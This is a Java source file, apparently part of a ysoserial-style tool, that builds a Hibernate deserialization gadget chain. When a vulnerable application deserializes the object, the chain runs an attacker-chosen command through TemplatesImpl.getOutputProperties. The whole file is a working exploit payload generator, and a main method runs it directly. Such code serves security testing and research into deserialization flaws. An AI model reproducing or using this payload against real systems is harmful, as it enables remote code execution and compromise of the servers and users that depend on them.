package jdk.payloadGroups;


import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import gadgetFragment.Entry2HashFragment;
import gadgetFragment.InvokeChainedFragment;
import org.hibernate.engine.spi.CollectionKey;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import jdk.payloadGroups.annotation.Authors;
import jdk.payloadGroups.annotation.PayloadTest;
import jdk.PayloadRunner;
import util.Reflections;


/**
 * java.util.concurrent.ConcurrentHashMap: void readObject(java.io.ObjectInputStream)
 * org.hibernate.engine.spi.CollectionKey: boolean equals(java.lang.Object)
 * org.hibernate.type.ComponentType: boolean isEqual(java.lang.Object,java.lang.Object,org.hibernate.engine.spi.SessionFactoryImplementor)
 * org.hibernate.type.ComponentType: java.lang.Object getPropertyValue(java.lang.Object,int)
 * org.hibernate.tuple.component.AbstractComponentTuplizer: java.lang.Object getPropertyValue(java.lang.Object,int)
 * org.hibernate.property.BasicPropertyAccessor$BasicGetter: java.lang.Object get(java.lang.Object)
 * java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])
 */
@PayloadTest(precondition = "isApplicableJavaVersion")
public class HibernateCK implements ObjectPayload<Object>, DynamicDependencies {
    public Object getObject (String command) throws Exception {
        Object tpl1 = InvokeChainedFragment.createTemplatesImpl(command);
        Object tpl2 = InvokeChainedFragment.createTemplatesImpl(command);
        Object getters = makeGetter(tpl1.getClass(), "getOutputProperties");
        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t1 = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t1, "componentTuplizer", tup);
        Reflections.setFieldValue(t1, "propertySpan", 1);
        int count = util.Utils.generateRandomInt()+1;
        Type[] propertyTypes = new Type[count];
        for (int i=0; i< count; i++){
            propertyTypes[i] = t1;
        }
        Reflections.setFieldValue(t1, "propertyTypes", propertyTypes);


        CollectionKey entityUniqueKey1 = Reflections.createWithoutConstructor(CollectionKey.class);
        CollectionKey entityUniqueKey2 = Reflections.createWithoutConstructor(CollectionKey.class);

        String entityName = util.Utils.generateRandomString();
        Reflections.setFieldValue(entityUniqueKey1, "role", entityName);
        Reflections.setFieldValue(entityUniqueKey2, "role", entityName);
        Reflections.setFieldValue(entityUniqueKey1, "keyType", t1);
        Reflections.setFieldValue(entityUniqueKey2, "keyType", t1);
        Reflections.setFieldValue(entityUniqueKey1, "key", tpl1);
        Reflections.setFieldValue(entityUniqueKey2, "key", tpl2);
        int hashCode = util.Utils.generateRandomInt();
        Reflections.setFieldValue(entityUniqueKey1, "hashCode",hashCode );
        Reflections.setFieldValue(entityUniqueKey2, "hashCode", hashCode);

        return Entry2HashFragment.makeHashtable(entityUniqueKey1,entityUniqueKey2);
    }

    static Object makeGetter (Class<?> tplClass, String method) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        Reflections.setAccessible(bgCon);

        if ( !method.startsWith("get") ) {
            throw new IllegalArgumentException("Hibernate4 can only call getters");
        }

        String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);

        Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(HibernateCK.class, args);
    }
}
